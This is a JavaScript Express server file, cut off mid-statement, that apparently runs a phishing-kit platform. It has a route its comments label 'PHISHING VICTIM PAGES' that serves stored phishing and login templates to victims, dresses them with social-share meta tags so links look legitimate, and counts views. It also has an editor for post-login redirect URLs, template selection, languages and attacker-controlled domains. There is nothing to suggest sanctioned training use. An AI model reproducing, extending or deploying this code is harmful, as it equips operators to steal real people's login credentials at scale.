import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import morgan from 'morgan';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';
import multer from 'multer';
import sharp from 'sharp';
import fs from 'fs';
import axios from 'axios';
import { testConnection, executeQuery } from './src/utils/database.js';
import { apiConfig } from './src/configs/database.config.js';
import { authenticateToken } from './src/api/middleware/auth.js';
import {
  hashPassword,
  comparePassword,
  generateToken,
  verifyToken,
  validatePassword,
  validateEmail,
  validateUsername
} from './src/utils/auth.js';
import { pusher } from './src/configs/pusher.config.js';
import templateFieldsRouter from './src/api/routes/templates/fields.js';
import captureRouter from './src/api/routes/capture.js';

// Load environment variables
dotenv.config();

// Resolve __dirname in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialize Express app
const app = express();
const PORT = parseInt(process.env.API_PORT) || apiConfig.port || 2324;
const authenticateUser = authenticateToken;
const strictRateLimiter = () => (req, res, next) => next();
const moderateRateLimiter = () => (req, res, next) => next();

// Middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://static.cloudflareinsights.com"],
      imgSrc: ["'self'", 'data:', 'https:', 'https://flagsapi.com'],
      connectSrc: [
        "'self'",
        'https:',
        'wss:',
        'https://*.pusher.com',
        'wss://*.pusher.com'
      ],
      styleSrc: ["'self'", 'https:', "'unsafe-inline'"],
      fontSrc: ["'self'", 'https:', 'data:']
    }
  }
}));
app.use(cors({
  origin: function (origin, callback) {
    const allowedOrigins = [
      'https://via88online.com',
      'http://localhost:3001',
      'http://localhost:2323',
      'http://localhost:3000',
      'http://localhost:5173',
      'http://via88online.com:5173',
      'http://51.79.188.189:5173',
      process.env.CORS_ORIGIN // Add dynamic origin from env
    ].filter(Boolean); // Remove undefined/null values

    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      console.log('Blocked by CORS:', origin);
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(morgan('combined'));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ==============================================
// PHISHING VICTIM PAGES (Must be before static files)
// ==============================================

// Render phishing page for victims - /p/:slug route
app.get('/p/:slug', async (req, res) => {
  console.log('🎯 Phishing route hit:', req.path, req.params.slug);
  try {
    const { slug } = req.params;

    const result = await executeQuery(
      'SELECT * FROM websites WHERE slug = ?',
      [slug]
    );

    if (result.data.length === 0) {
      return res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Page Not Found</title>
          <meta charset="utf-8">
        </head>
        <body>
          <h1>404 - Page Not Found</h1>
          <p>The requested page could not be found.</p>
        </body>
        </html>
      `);
    }

    const website = result.data[0];

    // If website uses template IDs, fetch template content
    if (website.phishing_template_id || website.login_template_id) {
      const templatePromises = [];

      if (website.phishing_template_id) {
        templatePromises.push(
          executeQuery('SELECT content_html FROM templates WHERE id = ?', [website.phishing_template_id])
        );
      }

      if (website.login_template_id) {
        templatePromises.push(
          executeQuery('SELECT content_html FROM templates WHERE id = ?', [website.login_template_id])
        );
      }

      const templateResults = await Promise.all(templatePromises);

      // Update website object with template content
      if (website.phishing_template_id && templateResults[0]?.data?.length > 0) {
        website.temp1 = templateResults[0].data[0].content_html;
      }

      if (website.login_template_id && templateResults[website.phishing_template_id ? 1 : 0]?.data?.length > 0) {
        website.temp2 = templateResults[website.phishing_template_id ? 1 : 0].data[0].content_html;
      }
    }

    // Increment view count
    await executeQuery(
      'UPDATE websites SET view_count = view_count + 1 WHERE id = ?',
      [website.id]
    );

    // Determine which template to use (prefer temp1, fallback to temp2)
    let templateContent = website.temp1 || website.temp2;

    if (!templateContent) {
      templateContent = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>${website.title || 'Loading...'}</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body>
          <h1>${website.title || 'Website'}</h1>
          <p>${website.description || 'No template configured for this website.'}</p>
        </body>
        </html>
      `;
    }

    // Inject SEO meta tags and update title
    const metaTitle = website.title || 'Loading...';
    const metaDescription = website.description || '';
    const metaThumbnail = website.thumbnail || '';

    // Replace or inject meta tags in template
    let finalHtml = templateContent;

    // Update title
    if (finalHtml.includes('<title>')) {
      finalHtml = finalHtml.replace(/<title>.*?<\/title>/i, `<title>${metaTitle}</title>`);
    } else if (finalHtml.includes('<head>')) {
      finalHtml = finalHtml.replace('<head>', `<head>\n  <title>${metaTitle}</title>`);
    }

    // Add meta description
    if (metaDescription && !finalHtml.includes('name="description"')) {
      finalHtml = finalHtml.replace('<head>', `<head>\n  <meta name="description" content="${metaDescription.replace(/"/g, '&quot;')}">`);
    }

    // Add Open Graph meta tags
    const ogTags = `
  <meta property="og:title" content="${metaTitle.replace(/"/g, '&quot;')}">
  <meta property="og:description" content="${metaDescription.replace(/"/g, '&quot;')}">
  <meta property="og:type" content="website">
  ${metaThumbnail ? `<meta property="og:image" content="${metaThumbnail}">` : ''}
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="${metaTitle.replace(/"/g, '&quot;')}">
  <meta name="twitter:description" content="${metaDescription.replace(/"/g, '&quot;')}">
  ${metaThumbnail ? `<meta name="twitter:image" content="${metaThumbnail}">` : ''}`;

    if (finalHtml.includes('<head>')) {
      finalHtml = finalHtml.replace('<head>', `<head>${ogTags}`);
    }

    // Add viewport meta if not present
    if (!finalHtml.includes('name="viewport"')) {
      finalHtml = finalHtml.replace('<head>', '<head>\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">');
    }

    res.send(finalHtml);

  } catch (error) {
    console.error('Phishing page render error:', error);
    res.status(500).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Error</title>
        <meta charset="utf-8">
      </head>
      <body>
        <h1>500 - Internal Server Error</h1>
        <p>An error occurred while loading the page.</p>
      </body>
      </html>
    `);
  }
});

// Note: /phishing/* routes are now handled by SPA fallback middleware

// Phishing edit route
app.get('/phishing/edit/:id', authenticateUser, async (req, res) => {
  try {
    const websiteId = req.params.id;
    const userId = req.user.id;

    // Get website data
    const websiteResult = await executeQuery(
      'SELECT * FROM websites WHERE id = ? AND user_id = ?',
      [websiteId, userId]
    );

    if (!websiteResult.success || websiteResult.data.length === 0) {
      return res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Website Not Found</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                .error { color: #e74c3c; }
            </style>
        </head>
        <body>
            <h1 class="error">404 - Website Not Found</h1>
            <p>The requested website could not be found or you don't have permission to edit it.</p>
            <a href="/dashboard">Back to Dashboard</a>
        </body>
        </html>
      `);
    }

    const website = websiteResult.data[0];

    // Get available templates
    const templatesResult = await executeQuery(
      'SELECT * FROM templates ORDER BY type, name'
    );

    const templates = templatesResult.success ? templatesResult.data : [];

    // Serve the edit page
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Website - ${website.title}</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #333;
        }
        input, textarea, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        textarea {
            height: 100px;
            resize: vertical;
        }
        .btn {
            background: #007bff;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-right: 10px;
        }
        .btn:hover {
            background: #0056b3;
        }
        .btn-secondary {
            background: #6c757d;
        }
        .btn-secondary:hover {
            background: #545b62;
        }
        .preview-link {
            display: inline-block;
            margin-top: 10px;
            color: #007bff;
            text-decoration: none;
        }
        .preview-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Edit Website: ${website.title}</h1>
        
        <form id="editForm">
            <div class="form-group">
                <label for="title">Title</label>
                <input type="text" id="title" name="title" value="${website.title}" required>
            </div>
            
            <div class="form-group">
                <label for="description">Description</label>
                <textarea id="description" name="description">${website.description || ''}</textarea>
            </div>
            
            <div class="form-group">
                <label for="slug">Slug (URL)</label>
                <input type="text" id="slug" name="slug" value="${website.slug}" required>
                <a href="http://localhost:3002/${website.slug}" target="_blank" class="preview-link">
                    Preview: http://localhost:3002/${website.slug}
                </a>
            </div>
            
            <div class="form-group">
                <label for="redirect_url">Redirect URL (after login)</label>
                <input type="url" id="redirect_url" name="redirect_url" value="${website.redirect_url || ''}">
            </div>
            
            <div class="form-group">
                <label for="phishing_template_id">Phishing Template</label>
                <select id="phishing_template_id" name="phishing_template_id">
                    <option value="">Select phishing template...</option>
                    ${templates.filter(t => t.type === 'phishing').map(template =>
      `<option value="${template.id}" ${website.phishing_template_id == template.id ? 'selected' : ''}>${template.name}</option>`
    ).join('')}
                </select>
            </div>
            
            <div class="form-group">
                <label for="login_template_id">Login Template</label>
                <select id="login_template_id" name="login_template_id">
                    <option value="">Select login template...</option>
                    ${templates.filter(t => t.type === 'login').map(template =>
      `<option value="${template.id}" ${website.login_template_id == template.id ? 'selected' : ''}>${template.name}</option>`
    ).join('')}
                </select>
            </div>
            
            <div class="form-group">
                <label for="language">Language</label>
                <select id="language" name="language">
                    <option value="en" ${website.language === 'en' ? 'selected' : ''}>English</option>
                    <option value="vi" ${website.language === 'vi' ? 'selected' : ''}>Vietnamese</option>
                    <option value="es" ${website.language === 'es' ? 'selected' : ''}>Spanish</option>
                    <option value="fr" ${website.language === 'fr' ? 'selected' : ''}>French</option>
                </select>
            </div>
            
            <div style="margin-top: 30px;">
                <button type="submit" class="btn">Update Website</button>
                <button type="button" class="btn btn-secondary" onclick="window.history.back()">Cancel</button>
            </div>
        </form>
    </div>

    <script>
        document.getElementById('editForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const formData = new FormData(e.target);
            const data = Object.fromEntries(formData.entries());
            
            try {
                const response = await fetch('/api/phishing/websites/${websiteId}', {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    alert('Website updated successfully!');
                    window.location.href = '/dashboard';
                } else {
                    alert('Error: ' + result.message);
                }
            } catch (error) {
                alert('Error updating website: ' + error.message);
            }
        });
        
        // Update preview link when slug changes
        document.getElementById('slug').addEventListener('input', (e) => {
            const previewLink = document.querySelector('.preview-link');
            previewLink.href = 'http://localhost:3002/' + e.target.value;
            previewLink.textContent = 'Preview: http://localhost:3002/' + e.target.value;
        });
    </script>
</body>
</html>
    `);

  } catch (error) {
    console.error('Error serving phishing edit page:', error);
    res.status(500).send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>Server Error</title>
          <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
              .error { color: #e74c3c; }
          </style>
      </head>
      <body>
          <h1 class="error">500 - Server Error</h1>
          <p>An error occurred while loading the edit page.</p>
      </body>
      </html>
    `);
  }
});

// Serve static files from dist directory (but not for phishing routes)
app.use((req, res, next) => {
  // Skip static file serving for phishing routes
  if (req.path.startsWith('/p/') || req.path.startsWith('/phishing/')) {
    return next();
  }

  // Serve static files for all other routes
  express.static(path.join(__dirname, 'dist'), {
    maxAge: '1d', // Cache for 1 day
    etag: true,
    lastModified: true
  })(req, res, next);
});

// Assets are handled by express.static middleware above

// Log uploads requests for debugging
app.use('/uploads', (req, res, next) => {
  console.log(`📁 Uploads request: ${req.method} ${req.path} from ${req.ip}`);
  next();
});

// Serve uploaded files from uploads directory with enhanced options
app.use('/uploads', express.static(path.join(__dirname, 'uploads'), {
  maxAge: '1y', // Cache for 1 year
  etag: true,
  lastModified: true,
  index: false, // Don't serve directory listings
  dotfiles: 'ignore', // Ignore dotfiles for security
  setHeaders: (res, path) => {
    // Set CORS headers for all uploads
    res.setHeader('Access-Control-Allow-Origin', 'https://via88online.com');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');

    // Set security headers
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');

    // Set appropriate content type based on file extension
    const ext = path.toLowerCase().split('.').pop();
    switch (ext) {
      case 'webp':
        res.setHeader('Content-Type', 'image/webp');
        break;
      case 'jpg':
      case 'jpeg':
        res.setHeader('Content-Type', 'image/jpeg');
        break;
      case 'png':
        res.setHeader('Content-Type', 'image/png');
        break;
      case 'gif':
        res.setHeader('Content-Type', 'image/gif');
        break;
      case 'svg':
        res.setHeader('Content-Type', 'image/svg+xml');
        break;
    }
  }
}));

// Configure multer for template images gallery
const templateImageStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadPath = path.join(__dirname, 'uploads', 'template-images');
    // Ensure directory exists
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath, { recursive: true });
    }
    cb(null, uploadPath);
  },
  filename: (req, file, cb) => {
    // Generate secure filename
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    const ext = path.extname(file.originalname).toLowerCase();
    const sanitizedName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_').substring(0, 50);
    cb(null, `template-img-${uniqueSuffix}-${sanitizedName}${ext}`);
  }
});

const templateImageUpload = multer({
  storage: templateImageStorage,
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Security: Only allow specific image types
    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp', 'image/svg+xml'];
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.svg'];

    const ext = path.extname(file.originalname).toLowerCase();
    const mimeType = file.mimetype.toLowerCase();

    if (allowedTypes.includes(mimeType) && allowedExtensions.includes(ext)) {
      // Additional security check for file content
      cb(null, true);
    } else {
      cb(new Error(`Invalid file type. Only ${allowedExtensions.join(', ')} files are allowed.`), false);
    }
  }
});

// Generic upload handler (used for language import and other simple uploads)
const genericUploadStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadPath = path.join(__dirname, 'uploads', 'imports');
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath, { recursive: true });
    }
    cb(null, uploadPath);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname).toLowerCase();
    const sanitizedName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_').substring(0, 80);
    cb(null, `upload-${uniqueSuffix}-${sanitizedName}${ext}`);
  }
});

const upload = multer({
  storage: genericUploadStorage,
  limits: { fileSize: 5 * 1024 * 1024 } // 5MB default
});

// Thumbnail uploads for templates and websites
const templateThumbStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadPath = path.join(__dirname, 'uploads', 'template');
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath, { recursive: true });
    }
    cb(null, uploadPath);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname).toLowerCase();
    const sanitizedName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_').substring(0, 80);
    cb(null, `template-thumb-${uniqueSuffix}-${sanitizedName}${ext}`);
  }
});

const websiteThumbStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadPath = path.join(__dirname, 'uploads', 'website');
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath, { recursive: true });
    }
    cb(null, uploadPath);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname).toLowerCase();
    const sanitizedName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_').substring(0, 80);
    cb(null, `website-thumb-${uniqueSuffix}-${sanitizedName}${ext}`);
  }
});

const templateUpload = multer({
  storage: templateThumbStorage,
  limits: { fileSize: 5 * 1024 * 1024 }
});

const websiteUpload = multer({
  storage: websiteThumbStorage,
  limits: { fileSize: 5 * 1024 * 1024 }
});

// Handle uploads 404 errors specifically
app.use('/uploads', (req, res) => {
  console.error(`❌ Upload file not found: ${req.path}`);
  res.status(404).json({
    status: 'error',
    message: 'File not found',
    path: req.path
  });
});

// Test database connection on startup
testConnection();

// Ensure users table exists with required columns
const ensureUsersTable = async () => {
  try {
    console.log('🔧 Ensuring users table structure...');

    const createTableSQL = `
      CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(255) NOT NULL UNIQUE,
        email VARCHAR(255) NOT NULL UNIQUE,
        password_hash VARCHAR(255) NULL,
        password VARCHAR(255) NULL,
        first_name VARCHAR(255) NULL,
        last_name VARCHAR(255) NULL,
        phone VARCHAR(50) NULL,
        avatar VARCHAR(500) NULL,
        bio TEXT NULL,
        is_active BOOLEAN DEFAULT TRUE,
        is_admin BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_email (email),
        INDEX idx_username (username),
        INDEX idx_is_active (is_active),
        INDEX idx_is_admin (is_admin)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    `;

    await executeQuery(createTableSQL);

    const schemaResult = await executeQuery('DESCRIBE users');
    if (!schemaResult.success) {
      console.error('❌ Cannot read users table structure');
      return;
    }

    const columns = schemaResult.data.map(col => col.Field);
    const ensureColumns = [
      { name: 'password_hash', sql: 'ALTER TABLE users ADD COLUMN password_hash VARCHAR(255) NULL' },
      { name: 'password', sql: 'ALTER TABLE users ADD COLUMN password VARCHAR(255) NULL' },
      { name: 'first_name', sql: 'ALTER TABLE users ADD COLUMN first_name VARCHAR(255) NULL' },
      { name: 'last_name', sql: 'ALTER TABLE users ADD COLUMN last_name VARCHAR(255) NULL' },
      { name: 'phone', sql: 'ALTER TABLE users ADD COLUMN phone VARCHAR(50) NULL' },
      { name: 'avatar', sql: 'ALTER TABLE users ADD COLUMN avatar VARCHAR(500) NULL' },
      { name: 'bio', sql: 'ALTER TABLE users ADD COLUMN bio TEXT NULL' },
      { name: 'is_active', sql: 'ALTER TABLE users ADD COLUMN is_active BOOLEAN DEFAULT TRUE' },
      { name: 'is_admin', sql: 'ALTER TABLE users ADD COLUMN is_admin BOOLEAN DEFAULT FALSE' },
      { name: 'created_at', sql: 'ALTER TABLE users ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP' },
      { name: 'updated_at', sql: 'ALTER TABLE users ADD COLUMN updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP' }
    ];

    for (const col of ensureColumns) {
      if (!columns.includes(col.name)) {
        try {
          await executeQuery(col.sql);
          console.log(`✅ Added missing column users.${col.name}`);
        } catch (error) {
          console.log(`⚠️ Could not add column users.${col.name}:`, error.message);
        }
      }
    }

    console.log('✅ Users table ensured');
  } catch (error) {
    console.error('❌ Error ensuring users table:', error);
  }
};

// Ensure websites table has correct structure
const ensureWebsitesTable = async () => {
  try {
    console.log('🔧 Ensuring websites table structure...');

    // First create basic table if not exists
    const createTableSQL = `
      CREATE TABLE IF NOT EXISTS websites (
        id INT AUTO_INCREMENT PRIMARY KEY,
        title VARCHAR(255) NOT NULL,
        description TEXT,
        slug VARCHAR(255) UNIQUE NOT NULL,
        redirect_url VARCHAR(500),
        temp1 TEXT,
        temp2 TEXT,
        thumbnail VARCHAR(500),
        language VARCHAR(10) DEFAULT 'en',
        domain VARCHAR(255),
        user_id INT NOT NULL DEFAULT 1,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_slug (slug),
        INDEX idx_user_id (user_id)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    `;

    await executeQuery(createTableSQL);
    console.log('✅ Basic websites table ensured');

    // Now check and add missing columns
    const schemaResult = await executeQuery('DESCRIBE websites');
    if (!schemaResult.success) {
      console.error('❌ Cannot read table structure');
      return;
    }

    const columns = schemaResult.data.map(col => col.Field);
    console.log(`📊 Current columns: ${columns.join(', ')}`);

    // Add phishing_template_id if missing
    if (!columns.includes('phishing_template_id')) {
      console.log('🔧 Adding phishing_template_id column...');
      const result1 = await executeQuery('ALTER TABLE websites ADD COLUMN phishing_template_id INT NULL');
      console.log('🔧 ADD phishing_template_id result:', result1);
      if (result1.success) {
        console.log('✅ phishing_template_id added successfully');
      } else {
        console.log('⚠️ Could not add phishing_template_id:', result1.error);
      }
    } else {
      console.log('✅ phishing_template_id already exists');
    }

    // Add login_template_id if missing  
    if (!columns.includes('login_template_id')) {
      console.log('🔧 Adding login_template_id column...');
      const result2 = await executeQuery('ALTER TABLE websites ADD COLUMN login_template_id INT NULL');
      console.log('🔧 ADD login_template_id result:', result2);
      if (result2.success) {
        console.log('✅ login_template_id added successfully');
      } else {
        console.log('⚠️ Could not add login_template_id:', result2.error);
      }
    } else {
      console.log('✅ login_template_id already exists');
    }

    // Add CSS/JS split columns if missing
    const cssJsColumns = [
      { name: 'temp1_css', sql: 'ALTER TABLE websites ADD COLUMN temp1_css TEXT NULL' },
      { name: 'temp1_js', sql: 'ALTER TABLE websites ADD COLUMN temp1_js TEXT NULL' },
      { name: 'temp2_css', sql: 'ALTER TABLE websites ADD COLUMN temp2_css TEXT NULL' },
      { name: 'temp2_js', sql: 'ALTER TABLE websites ADD COLUMN temp2_js TEXT NULL' }
    ];
    for (const col of cssJsColumns) {
      if (!columns.includes(col.name)) {
        console.log(`🔧 Adding ${col.name} column...`);
        try {
          const addColResult = await executeQuery(col.sql);
          console.log(`✅ ${col.name} added:`, addColResult.success);
        } catch (e) {
          console.log(`⚠️ Could not add ${col.name}:`, e.message || e);
        }
      } else {
        console.log(`✅ ${col.name} already exists`);
      }
    }

    // Add view_count if missing (seems to be in existing table)
    if (!columns.includes('view_count')) {
      console.log('🔧 Adding view_count column...');
      try {
        await executeQuery('ALTER TABLE websites ADD COLUMN view_count INT DEFAULT 0');
        console.log('✅ view_count added successfully');
      } catch (error) {
        console.log('⚠️ Could not add view_count:', error.message);
      }
    }

    // Final check
    const finalSchema = await executeQuery('DESCRIBE websites');
    if (finalSchema.success) {
      const finalColumns = finalSchema.data.map(col => col.Field);
      const hasTemplateIds = finalColumns.includes('phishing_template_id') && finalColumns.includes('login_template_id');
      console.log(`📊 Final columns: ${finalColumns.join(', ')}`);
      console.log(`🆔 Template ID columns: ${hasTemplateIds ? 'YES' : 'NO'}`);
    }

  } catch (error) {
    console.error('❌ Error ensuring websites table:', error);
  }
};

// Ensure user_analytics table exists and has required columns
const ensureUserAnalyticsTable = async () => {
  try {
    console.log('🔧 Ensuring user_analytics table structure...');

    const createTableSQL = `
      CREATE TABLE IF NOT EXISTS user_analytics (
        user_id INT PRIMARY KEY,
        balance DECIMAL(10,2) DEFAULT 0,
        total_balance DECIMAL(10,2) DEFAULT 0,
        tool_use_count INT DEFAULT 0,
        points INT DEFAULT 0,
        page_views INT DEFAULT 0,
        last_activity DATETIME NULL,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_last_activity (last_activity),
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    `;

    await executeQuery(createTableSQL);

    const schemaResult = await executeQuery('DESCRIBE user_analytics');
    if (!schemaResult.success) {
      console.error('❌ Cannot read user_analytics table structure');
      return;
    }

    const columns = schemaResult.data.map(col => col.Field);

    if (!columns.includes('points')) {
      console.log('🔧 Adding points column to user_analytics...');
      try {
        await executeQuery('ALTER TABLE user_analytics ADD COLUMN points INT DEFAULT 0');
        console.log('✅ points added to user_analytics');
      } catch (error) {
        console.log('⚠️ Could not add points to user_analytics:', error.message);
      }
    }

    console.log('✅ User analytics table ensured');
  } catch (error) {
    console.error('❌ Error ensuring user_analytics table:', error);
  }
};

// Ensure ip_blacklist table exists (used by admin/auth flows)
const ensureIpBlacklistTable = async () => {
  try {
    console.log('🔧 Ensuring ip_blacklist table structure...');

    const createTableSQL = `
      CREATE TABLE IF NOT EXISTS ip_blacklist (
        id INT AUTO_INCREMENT PRIMARY KEY,
        user_id INT NOT NULL,
        ip_address VARCHAR(45) NOT NULL,
        created_by INT NULL,
        reason VARCHAR(255) NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        UNIQUE KEY uniq_user_ip (user_id, ip_address),
        INDEX idx_user_id (user_id),
        INDEX idx_ip_address (ip_address),
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    `;

    await executeQuery(createTableSQL);
    console.log('✅ ip_blacklist table ensured');
  } catch (error) {
    console.error('❌ Error ensuring ip_blacklist table:', error);
  }
};

// Ensure domains + domain_users tables exist (used by phishing website creation/edit)
const ensureDomainsTables = async () => {
  try {
    console.log('🔧 Ensuring domains tables structure...');

    const createDomainsTableSQL = `
       CREATE TABLE IF NOT EXISTS domains (
         id INT AUTO_INCREMENT PRIMARY KEY,
         domain_name VARCHAR(255) NOT NULL UNIQUE,
         description TEXT,
         is_active BOOLEAN DEFAULT TRUE,
         access_type ENUM('public', 'private') DEFAULT 'public',
         created_by INT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
         INDEX idx_domain_name (domain_name),
         INDEX idx_is_active (is_active),
         INDEX idx_access_type (access_type),
         INDEX idx_created_by (created_by),
         FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
       ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
     `;

    const createDomainUsersTableSQL = `
       CREATE TABLE IF NOT EXISTS domain_users (
         id INT AUTO_INCREMENT PRIMARY KEY,
         domain_id INT NOT NULL,
         user_id INT NOT NULL,
         granted_by INT,
         granted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         UNIQUE KEY unique_domain_user (domain_id, user_id),
         INDEX idx_domain_id (domain_id),
         INDEX idx_user_id (user_id),
         FOREIGN KEY (domain_id) REFERENCES domains(id) ON DELETE CASCADE,
         FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
         FOREIGN KEY (granted_by) REFERENCES users(id) ON DELETE SET NULL
       ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
     `;

    await executeQuery(createDomainsTableSQL);
    await executeQuery(createDomainUsersTableSQL);

    const domainsSchema = await executeQuery('DESCRIBE domains');
    if (domainsSchema.success) {
      const domainCols = domainsSchema.data.map(col => col.Field);
      const ensureDomainColumns = [
        { name: 'access_type', sql: "ALTER TABLE domains ADD COLUMN access_type ENUM('public','private') DEFAULT 'public'" },
        { name: 'created_by', sql: 'ALTER TABLE domains ADD COLUMN created_by INT NULL' },
        { name: 'created_at', sql: 'ALTER TABLE domains ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP' },
        { name: 'updated_at', sql: 'ALTER TABLE domains ADD COLUMN updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP' }
      ];
      for (const col of ensureDomainColumns) {
        if (!domainCols.includes(col.name)) {
          try {
            await executeQuery(col.sql);
          } catch (error) {
            console.log(`⚠️ Could not add ${col.name} to domains:`, error.message);
          }
        }
      }
    }

    const domainUsersSchema = await executeQuery('DESCRIBE domain_users');
    if (domainUsersSchema.success) {
      const duCols = domainUsersSchema.data.map(col => col.Field);
      const ensureDuColumns = [
        { name: 'granted_by', sql: 'ALTER TABLE domain_users ADD COLUMN granted_by INT NULL' },
        { name: 'granted_at', sql: 'ALTER TABLE domain_users ADD COLUMN granted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP' }
      ];
      for (const col of ensureDuColumns) {
        if (!duCols.includes(col.name)) {
          try {
            await executeQuery(col.sql);
          } catch (error) {
            console.log(`⚠️ Could not add ${col.name} to domain_users:`, error.message);
          }
        }
      }
    }

    console.log('✅ Domains tables ensured');
  } catch (error) {
    console.error('❌ Error ensuring domains tables:', error);
  }
};

// Ensure templates + template_fields tables exist (used by templates & phishing flows)
const ensureTemplatesTables = async () => {
  try {
    console.log('🔧 Ensuring templates tables structure...');

    const createTemplatesTableSQL = `
       CREATE TABLE IF NOT EXISTS templates (
         id INT AUTO_INCREMENT PRIMARY KEY,
